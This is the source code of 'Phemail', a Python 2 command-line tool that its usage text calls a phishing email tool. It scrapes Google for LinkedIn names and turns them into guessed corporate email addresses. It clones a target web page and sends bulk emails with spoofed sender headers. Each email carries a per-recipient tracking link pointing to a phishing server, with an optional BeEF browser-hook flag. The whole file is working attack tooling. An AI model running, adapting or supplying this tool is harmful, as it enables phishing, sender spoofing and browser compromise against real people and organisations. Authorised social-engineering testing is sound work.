#!/usr/bin/python

import smtplib, base64, os, sys, getopt, urllib2, urllib, re, socket, time, itertools, urlparse
try:
    #from BeautifulSoup import BeautifulSoup
    from bs4 import BeautifulSoup
except:
    print "No BeautifulSoup installed"
    print "See: http://www.crummy.com/software/BeautifulSoup/#Download"
    sys.exit()
try:
    import DNS
except:
    print "No pyDNS installed"

from optparse import OptionParser
from email.mime.multipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
from datetime import datetime

version=0.13

class sendEmails:

    def __init__(self):
        self.FROM_ADDRESS = None
        self.MAIL_FROM_ADDRESS = None
        self.REPLY_TO_ADDRESS = None
        self.SUBJECT = 'Test'
        self.filemail = 'emails.txt'
        self.filebody = 'body.txt'
        self.delay = 3
        self.limit = 50
        self.Discovered = {}
        self.emailSent = []
        self.emailFail = []
        self.google = False
        self.guser = 'test'
        self.gpass = 'test'
        self.MAIL_SERVER = None
        self.Beef = False
        self.verbose = False
        self.output = False
        self.socEngWebsite = ''

    def getWebServer(self):
        webserver = self.socEngWebsite
        return webserver

    def discoverSMTP(self, domain):
        DNS.DiscoverNameServers()
        mx_hosts = DNS.mxlookup(domain)
        return mx_hosts

    def checkEmail(self, emails):
        for email in emails:
            if not re.match(r"([a-zA-Z\.\-\_0-9]+)\@([a-zA-Z\.\-\_0-9]+)\.([a-z]+)", email):
                print "Error: not a valid email "+email
                print "Check "+self.filemail
                exit()

    def discoveredDomain (self, emails):
        for email in emails:
            domain = email.split('@')[1]
            if domain not in self.Discovered:
                self.Discovered[domain] = self.discoverSMTP(domain)
        return self.Discovered

    def writeLog(self):
        emailSent = self.emailSent
        emailFail = self.emailFail
        now = datetime.now().strftime("%d-%m-%Y_%H-%M")
        f = open("phemail-log-"+now+".txt","w")
        emailSent = sorted(set(emailSent))
        emailFail = sorted(set(emailFail))
        command = ' '.join(sys.argv)
        f.write(command)
        f.write("\n\nSuccessful Emails Sent:\n")
        f.write("-------------------------\n")
        for email in emailSent: f.write("%s\n" % email)
        f.write("\nFailed Emails Sent:\n")
        f.write("-------------------------\n")
        for email in emailFail: f.write("%s\n" % email)
        f.close()
        print "Phemail.py log file saved: phemail-log-"+now+".txt"

    def removePictures(self,pict):
        for i in enumerate(pict):
            os.remove('image'+str(i)+'.jpg')

    def createMail(self,email):
        FROM_ADDRESS = self.FROM_ADDRESS
        MAIL_FROM_ADDRESS = self.MAIL_FROM_ADDRESS
        SUBJECT = self.SUBJECT
        REPLY_TO_ADDRESS = self.REPLY_TO_ADDRESS
        filemail = self.filemail

        webserverLog = datetime.now().strftime("%d_%m_%Y_%H:%M")
        try:
            fb = open(self.filebody, 'rb')
        except IOError:
            print "File not found: "+self.filebody
            sys.exit()
        body = fb.read()
        webserver = self.getWebServer()
        msg = MIMEMultipart('related')
        msg['mail from'] = FROM_ADDRESS
        msg['from'] = MAIL_FROM_ADDRESS
        msg['subject'] = SUBJECT
        msg['reply-to'] = REPLY_TO_ADDRESS
        msg['to'] = email
        #msg['cc'] = REPLY ADDRESS
        msg.preamble = 'This is a multi-part message in MIME format.'
        msgAlt = MIMEMultipart('alternative')
        msg.attach(msgAlt)
        msgText = MIMEText('This is the alternative plain text message.')
        msgAlt.attach(msgText)
        html = BeautifulSoup(body, "lxml")
        pict=[]
        for i,x in enumerate(html.findAll('img')):
            picname = 'image'+str(i)+'.jpg'
            try:
                ft = open(picname, 'rb')
            except IOError :
                #urllib.urlretrieve(x['src'], picname)
                print "Downloaded "+picname
                ft = open(picname, 'rb')
            pict.append(MIMEImage(ft.read()))
            ft.close()
            body = body.replace(x['src'].encode('utf-8'),  'cid:image'+str(i))

        # Beef Option
        if self.Beef : url=webserver+"/index.php?e="+base64.b64encode(email).rstrip("=")+"&b=1"
        else: url=webserver+"/index.php?e="+base64.b64encode(email).rstrip("=")+"&b=0"

        url = url+"&l="+base64.b64encode(webserverLog).rstrip("=")
        msgAlt.attach(MIMEText(body.format(url),'html'))
        for i,pic in enumerate(pict):
            pic.add_header('Content-ID', '<image'+str(i)+'>')
            msg.attach(pic)
        fb.close()
        return FROM_ADDRESS, msg['to'], msg.as_string(), pict

    def sendMail(self):
        delay = self.delay
        verbose = self.verbose
        MAIL_SERVER = self.MAIL_SERVER
        numLimit = int(self.limit)
        limit = 0
        webserver = self.getWebServer()
        # get emails
        Emails = [line.strip() for line in open(self.filemail)]
        # sort and unique Emails
        Emails = sorted(set(Emails))
        self.checkEmail(Emails)
        emailSent = self.emailSent
        emailFail = self.emailFail
        Discovered = self.discoveredDomain(Emails)

        for domain in Discovered:
            print "Domain: "+domain
            # check if the SMTP Server option is provided
            if MAIL_SERVER :
                print "SMTP server: "+MAIL_SERVER
                server = smtplib.SMTP(MAIL_SERVER)
                mx = itertools.cycle([(10, MAIL_SERVER)])
                mx_current = mx.next()[1]
                #server.helo
            else:
                if Discovered[domain]:
                    mx = itertools.cycle(Discovered[domain])
                    mx_current = mx.next()[1]
                    print "SMTP server: "+mx_current
                    server = smtplib.SMTP(mx_current)
                    #server.helo

            for email in Emails:
                if domain == email.split('@')[1]:
                    FROM, TO, MSG, pict = self.createMail(email)
                    try:
                        # Uncomment this for debugging
                        if verbose : server.set_debuglevel(1)
                        server.sendmail(FROM, TO, MSG)
                        print "Sent to "+email
                        time.sleep(delay)
                        emailSent.append(email)
                    except Exception,e:
                        print "Error: sending to "+email
                        emailFail.append(email)
                        if verbose : print e
                    limit = limit + 1
                    if numLimit == limit:
                        print "Connection closed to SMTP server: "+mx_current
                        server.close()
                        time.sleep(delay)
                        mx_current = mx.next()[1]
                        print "Domain: "+domain
                        print "SMTP server: "+mx_current
                        server = smtplib.SMTP(mx_current)
                        limit = 0

        if self.output: self.writeLog()
        print "PHishing URLs point to "+webserver

    def sendGMail(self):
        guser = self.guser
        gpass = self.gpass
        delay = self.delay
        numLimit = int(self.limit)
        limit = 0
        verbose = self.verbose
        MAIL_SERVER= self.MAIL_SERVER
        webserver = self.getWebServer()
        # get emails
        Emails = [line.strip() for line in open(self.filemail)]
        # sort and unique
        Emails = sorted(set(Emails))
        self.checkEmail(Emails)
        emailSent = self.emailSent
        emailFail = self.emailFail
        MAIL_SERVER = 'smtp.sendgrid.net'

        print "SMTP server: "+ MAIL_SERVER
        server = smtplib.SMTP(MAIL_SERVER,587)

        # Login
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(guser, gpass)

        for email in Emails:
            FROM, TO, MSG, pict = self.createMail(email)
            if email not in emailSent:
                try:
                    if verbose : server.set_debuglevel(1)
                    server.sendmail(FROM, TO, MSG)
                    print "Sent to "+email
                    time.sleep(delay)
                    emailSent.append(email)
                except Exception,e:
                    print "Error: sending to "+email
                    emailFail.append(email)
                    if verbose : print e
                limit = limit + 1

            if numLimit == limit :
                print "Connection closed to SMTP server: "+MAIL_SERVER
                server.close()
                time.sleep(delay)
                print "SMTP server: "+MAIL_SERVER
                server = smtplib.SMTP(MAIL_SERVER,587)
                limit = 0

        #self.removePictures(pict)
        if self.output: self.writeLog()
        print "PHishing URLs point to "+webserver

        # Logout
        server.close()

class harvestEmails:

    def __init__(self):
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.format = 0
        self.pages = 10
        self.search = "example"
        self.domain = "example.com"
        self.verbose = False
        self.run = False


    def gatherEmails(self):
        pages = self.pages
        search = self.search.replace(" ","+")
        domain = self.domain
        format = self.format
        verbose = self.verbose
        emails = []
        print "Gathering emails for domain: "+domain
        print "Google Query: "+search
        for page in range (0, pages):
            url = "http://www.google.co.uk/search?hl=en&safe=off&q=site:linkedin.com/pub+"+re.sub('\..*','',search)+"&start="+str(page)+"0"
            if verbose: print "Google Query "+url
            request=urllib2.Request(url,None,self.headers)
            response = urllib2.urlopen(request)
            data = response.read()
            html = BeautifulSoup(data, "lxml")
            regex = re.compile("linkedin\.com/pub/([a-zA-Z\'\-]+)\-([\-a-zA-Z\']+)")
            usernames = regex.findall(str(html))
            if verbose: print usernames
            sys.stdout.write("\r%d%%" %((100*(page+1))/pages))
            sys.stdout.flush()
            for email in usernames:
                if format == '0' : emails.append(email[0]+" "+email[1]+"@"+domain)           # 0- firstname surname
                elif format == '1' : emails.append(email[0]+"."+email[1]+"@"+domain)         # 1- firstname.surname@example.com
                elif format == '2' : emails.append(email[0]+email[1]+"@"+domain)             # 2- firstnamesurname@example.com
                elif format == '3' : emails.append(email[0][0:1]+"."+email[1]+"@"+domain)    # 3- f.surname@example.com
                elif format == '4' : emails.append(email[0]+"."+email[1][0:1]+"@"+domain)    # 4- firstname.s@example.com
                elif format == '5' : emails.append(email[1]+"."+email[0]+"@"+domain)         # 5- surname.firstname@example.com
                elif format == '6' : emails.append(email[1][0:1]+"."+email[0]+"@"+domain)    # 6- s.firstname@example.com
                elif format == '7' : emails.append(email[0][0:1]+"@"+domain)                 # 7- surname.f@example.co
                elif format == '8' : emails.append(email[1]+email[0]+"@"+domain)             # 8- surnamefirstname@example.com
                elif format == '9' : emails.append(email[0]+"_"+email[1]+"@"+domain)         # 9- firstname_surname@example.com
        # sort and unique
        emails = sorted(set(emails))
        # write into file
        f = open("emails.txt","w")
        print ""
        for email in emails: f.write("%s\n" % email); print email
        f.close()
        print "\nemails.txt updated"
        sys.exit()

class cloneWebsite:
    def __init__(self):
        self.URL = ""
        self.run = False

    def Page(self):
        print self.URL
        process = os.system("wget --no-check-certificate -c -k -O clone.html "+self.URL)
        if process == 0 :
            print "Cloned web page saved: clone.html"
        else :
            print "[!] Cloning could not be completed. Please install wget: https://www.gnu.org/software/wget/"

def usage(version):
    print "PHishing EMAIL tool v"+str(version)+"\nUsage: " + os.path.basename(sys.argv[0]) + """ [-e <emails>] [-m <mail_server>] [-f <from_address>] [-r <replay_address>] [-s <subject>] [-b <body>]
          -e    emails: File containing list of emails (Default: emails.txt)
          -F    mail from: SMTP email address header (Default: Name Surname <name_surname@example.com>)
          -f    from: Source email address displayed in FROM field of the email (Default: Name Surname <name_surname@example.com>)
          -r    reply_address: Actual email address used to send the emails in case that people reply to the email
          -s    subject: Subject of the email (Default: Newsletter)
          -b    body: Body of the email (Default: body.txt)
          -p    pages: Specifies number of results pages searched (Default: 10 pages)
          -v    verbose: Verbose Mode (Default: false)
          -l    layout: Send email with no embedded pictures
          -B    BeEF: Add the hook for BeEF
          -m    mail_server: SMTP mail server to connect to
          -g    Google: Use a google account username:password
          -t    Time delay: Add deleay between each email (Default: 3 sec)
          -L    webserverLog: Customise the name of the webserver log file (Default: Date time in format "%d_%m_%Y_%H_%M")
          -S    Search: query on Google
          -d    domain: of email addresses
          -n    number: of emails per connection (Default: 10 emails)
          -c    clone: Clone a web page
          -w    website: where the phishing email link points to
          -o    save output in a file
          -T    Type Format (Default: 0):
                0- firstname surname
                1- firstname.surname@example.com
                2- firstnamesurname@example.com
                3- f.surname@example.com
                4- firstname.s@example.com
                5- surname.firstname@example.com
                6- s.firstname@example.com
                7- surname.f@example.com
                8- surnamefirstname@example.com
                9- firstname_surname@example.com
          """
    print "Examples: "+ os.path.basename(sys.argv[0]) +" -e emails.txt -f \"Name Surname <name_surname@example.com>\" -r \"Name Surname <name_surname@example.com>\" -s \"Subject\" -b body.txt"
    print "          "+ os.path.basename(sys.argv[0]) +" -S example -d example.com -T 1 -p 12"
    print "          "+ os.path.basename(sys.argv[0]) +" -c https://example.com"

if __name__ == "__main__":
    # command line arguments / switches

    sender = sendEmails()
    harvester = harvestEmails()
    cloner = cloneWebsite()

    if sys.argv[1:]:
        optlist, args = getopt.getopt(sys.argv[1:], 'he:f:F:r:s:b:p:g:w:lBm:vL:T:S:d:t:n:c:R:w:o')

        for o, a in optlist:
            if o == "-h":
                usage(version)
                sys.exit()
            elif o == "-e":
                sender.filemail = a
            elif o == "-F":
                sender.MAIL_FROM_ADDRESS = a
            elif o == "-f":
                sender.FROM_ADDRESS = a
            elif o == "-r":
                sender.REPLY_TO_ADDRESS = a
            elif o == "-s":
                sender.SUBJECT =a
            elif o == "-b":
                sender.filebody = a
            elif o == "-S":
                harvester.run = True
                harvester.search = a
            elif o == "-d":
                harvester.domain = a
            elif o == "-T":
                harvester.format = a
            elif o == "-p":
                harvester.pages = int(a)
            elif o == "-l":
                NoPict = True
            elif o == "-m":
                sender.MAIL_SERVER = a
            elif o == "-B":
                sender.Beef = a
            elif o == "-w":
                sender.socEngWebsite = a
            elif o == "-o":
                sender.output = True
            elif o == "-c":
                # check URL - default
                pUrl = urlparse.urlparse(a)
                cloner.URL = a
                #clean up supplied URLs
                cloner.scheme = pUrl.scheme.lower()
                cloner.netloc = pUrl.netloc.lower()
                if not cloner.scheme:
                    print 'ERROR: http(s):// prefix required'
                    exit(1)
                cloner.run = True
            elif o == "-v":
                harvester.verbose = True
                sender.verbose = True
                cloner.verbose = True
            elif o == "-g":
                sender.google = True
                sender.guser,sender.gpass = a.split(":")
            elif o == "-t":
                sender.delay = int(a)
            elif o == "-n":
                sender.limit = int(a)
            elif o == "-L":
                webserverLog = "".join([c for c in a if re.match(r'\w', c)])
            else:
                usage(version)
                sys.exit()

    else:
        usage(version)
        sys.exit()

    if harvester.run : harvester.gatherEmails()
    if cloner.run : cloner.Page(); sys.exit()

    if sender.google :
        sender.sendGMail()
    else:
        if sender.FROM_ADDRESS == None : print "Error: from_address not specified"; exit()
        sender.sendMail()
